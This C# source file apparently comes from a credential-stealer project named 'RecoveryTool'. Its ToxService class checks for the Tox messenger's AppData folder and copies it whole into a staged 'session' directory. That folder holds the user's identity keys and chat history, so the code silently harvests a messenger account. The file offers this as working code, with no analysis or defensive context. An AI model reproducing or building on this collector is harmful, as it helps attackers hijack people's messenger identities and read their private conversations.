using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class ToxService
    {
        public static async Task SaveToxAsync()
        {
            string toxFolder = Path.Combine(Common.AppData, "Tox");
            if (!Directory.Exists(toxFolder)) return;

            string toxSession = Common.EnsureToxPath();
            await MessengerHelper.CopyDirectoryAsync(toxFolder, toxSession);
        }
    }
}
